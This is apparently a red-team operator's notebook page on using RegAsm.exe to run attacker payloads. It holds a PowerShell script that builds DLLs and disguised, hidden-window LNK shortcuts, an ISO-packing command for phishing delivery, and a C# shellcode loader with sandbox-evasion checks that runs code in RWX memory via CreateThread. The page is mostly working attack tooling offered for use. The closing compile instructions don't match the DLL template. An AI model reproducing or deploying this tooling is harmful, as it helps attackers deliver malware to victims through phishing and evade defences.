---
creation date: January 19th 2022
last modified date: January 19th 2022
aliases: []
tags: #📖
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]]
Links: [[03 - Content/Phishing Payloads]] - [[HexDump]]
Search Tag: #📖  

# [[Regasm]]  
## Standard Loader 
https://gist.github.com/matterpreter/03e2bd3cf8b26d57044f3b494e73bbea

- Build as .NET Framework DLL (64-bit)
- Run with `C:\Windows\System32\Microsoft\Framework64\v4.0.30314\RegAsm.exe /u <NameOfDLL>`
- If compiling with a .sln, ensure that ComVisible is set to true in the AssemblyInfo.cs file under Properties
- Add a reference to System.EnterpriseServices.dll

## Compile and Make LNKs 
###  Generate DLLs and LNKs with PowerShell
```powershell 
$Path = "C:\Users\rvauser\Source\Repos\RegistrationUtility"
cd $Path
$csFiles = Get-ChildItem -Path $Path -Filter *.cs
ForEach ($Item in $csFiles) {
    $basename = $Item.BaseName
    if ($basename -Match "x64") {
        $Program = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        $Arguments = "/platform:x64"
    } else {
        $Program = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        $Arguments = "/platform:x86"
    }
    $Arguments += " /r:System.EnterpriseServices.dll /target:library /out:SpeedTest-$basename.dll $basename.cs"
    Write-Output "Compiling $basename"
    Start-Process -WindowStyle Hidden -Wait -FilePath $Program -ArgumentList $Arguments
}

$dlls = Get-ChildItem -Path $Path -Filter *.dll -Force
$WshShell = New-Object -ComObject WScript.Shell

ForEach ($Item in $dlls) {
    $basename = $Item.BaseName
    Write-Output "Creating shortcut for $basename"
    $itemDir = New-Item -Path $Path -Name $basename -ItemType "directory"
    $lnkName = Join-Path $itemdir -ChildPath ($basename + ".lnk")

    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($lnkName)
    $Shortcut.RelativePath = "."
    if ($basename -Match "x64") {
        $Shortcut.TargetPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    } else {
        $Shortcut.TargetPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    }
    $Shortcut.Arguments = "/u " + $basename + ".dll"
    $Shortcut.WindowStyle = 7
    $Shortcut.IconLocation = "C:\WINDOWS\system32\imageres.dll,278"
    $Shortcut.Save()

    $dllCopy = Copy-Item -PassThru -Path $Item -Destination (Join-Path $itemDir -ChildPath ($basename + ".dll"))

    if (-Not (($dllCopy.Attributes.ToString() -Split ", ") -Contains "Hidden")) {
        $dllCopy.Attributes += 'Hidden'
    }
}
```

## Convert to ISOs 
Perform this from kali using https://github.com/mgeeky/PackMyPayload from the directory where your LNK+DLL folders live.
```bash 
find . -type d | cut -f 2 -d '/' | xargs -I {} python3 /opt/PackMyPayload/PackMyPayload.py -v {}/ {}.iso
```

### Shellcode by Hand 
For getting shellcode, please reference ![[HexDump#Bin to C]]

This template is for x64 only 
```csharp
using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.VisualBasic.Devices;

namespace RegistrationUtility
{

    public class RegistrationAssembly : ServicedComponent
    {
        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
	        string dom = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName.ToLower();
            /*if (!dom.Equals("domain.local"))
            {
                return;
            }*/

            if (Environment.ProcessorCount < 4)
            {
                return;
            }

            if (new ComputerInfo().TotalPhysicalMemory < (4 * 1024 * (long)1024 * 1024))
            {
                return;
            }
            
            Process[] processlist = Process.GetProcesses();

            foreach (Process process in processlist)
            {
                if (process.ProcessName.ToLower() == "regasm")
                {
                    ShowWindow(process.MainWindowHandle, 0);
                    break;
                }
            }

            byte[] buf = new byte[3] { 0xc0,0xff,0xee };
            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)buf.Length,
                              (uint)StateEnum.MEM_COMMIT,
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int ShowWindow(IntPtr hwnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        public RegistrationAssembly() { }


    }
}
```

How to compile:
===============
`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shellcodeLauncher.exe regasm-x64.cs
How to use:
============
`c:\> shellcodeLauncher.exe

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 19th 2022 (07:48 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
